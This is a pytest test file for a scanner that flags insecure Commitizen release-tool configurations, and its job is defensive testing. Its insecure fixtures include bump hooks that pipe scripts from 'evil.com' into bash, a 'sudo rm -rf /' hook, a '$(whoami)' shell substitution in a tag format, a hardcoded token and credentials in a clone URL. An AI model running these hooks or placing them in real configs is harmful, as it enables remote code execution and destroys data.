"""Tests for CommitizenAnalyzer."""

from pathlib import Path

from devai.commitizen_analyzer import CommitizenAnalyzer, CommitizenFinding


INSECURE_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.commitizen]
name = "cz_conventional_commits"
version = "0.1.0"
gpg_sign = false
version_provider = "myapp.version:get_version"
tag_format = "v$version-$(whoami)"
pre_bump_hooks = [
    "curl http://evil.com/install.sh | bash",
    "sudo rm -rf /",
]
api_key = "hardcoded-secret-token-12345"
"""

HARDENED_PYPROJECT = """\
[project]
name = "example"
version = "0.1.0"

[tool.commitizen]
name = "cz_conventional_commits"
version = "0.1.0"
version_files = ["pyproject.toml:project.version"]
tag_format = "v$version"
gpg_sign = true
pre_bump_hooks = ["python -m pytest tests"]
"""

INSECURE_CZ_TOML = """\
[tool.commitizen]
name = "cz_conventional_commits"
gpg_sign = false
post_bump_hooks = ["git clone http://user:pass@github.com/org/repo.git"]
"""

INSECURE_CZ_JSON = """\
{
  "commitizen": {
    "name": "cz_conventional_commits",
    "gpg_sign": false,
    "version_provider": "custom.provider:read",
    "pre_bump_hooks": ["curl http://evil.com/script.sh | bash"]
  }
}
"""


class TestCommitizenAnalyzer:
    def test_detects_insecure_pyproject(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "dangerous_command" in kinds
        assert "sudo_usage" in kinds
        assert "gpg_sign_disabled" in kinds
        assert "custom_version_provider" in kinds
        assert "tag_format_shell" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_pyproject_clean(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert high == []
        assert analyzer.health_score() == 100.0

    def test_detects_cz_toml(self, tmp_path: Path):
        (tmp_path / ".cz.toml").write_text(INSECURE_CZ_TOML, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert any(f.path == ".cz.toml" for f in findings)
        assert any(f.kind == "scm_credentials" for f in findings)
        assert any(f.kind == "gpg_sign_disabled" for f in findings)

    def test_detects_cz_json(self, tmp_path: Path):
        (tmp_path / "cz.json").write_text(INSECURE_CZ_JSON, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "dangerous_command" in kinds
        assert "custom_version_provider" in kinds
        assert "gpg_sign_disabled" in kinds

    def test_skips_pyproject_without_commitizen(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(
            '[project]\nname = "example"\nversion = "0.1.0"\n',
            encoding="utf-8",
        )
        analyzer = CommitizenAnalyzer(str(tmp_path))
        assert analyzer.config_files() == []
        assert analyzer.health_score() == 100.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        finding = next(f for f in findings if f.kind == "hardcoded_secret")
        assert finding.path == "pyproject.toml"
        assert "[high]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = CommitizenAnalyzer(str(tmp_path))
        assert "Commitizen configs:" in analyzer.summary()
        ctx = analyzer.to_context()
        assert "Commitizen analysis:" in ctx
        assert "health score:" in ctx

    def test_generate_hardened_template(self):
        snippet = CommitizenAnalyzer(".").generate_hardened_template()
        assert "commitizen" in snippet.lower()
        assert "gpg_sign = true" in snippet

    def test_no_configs_returns_full_score(self, tmp_path: Path):
        analyzer = CommitizenAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_finding_dataclass(self):
        finding = CommitizenFinding(
            kind="test",
            severity="low",
            message="test message",
            path="pyproject.toml",
            lineno=1,
        )
        assert "test message" in finding.format()
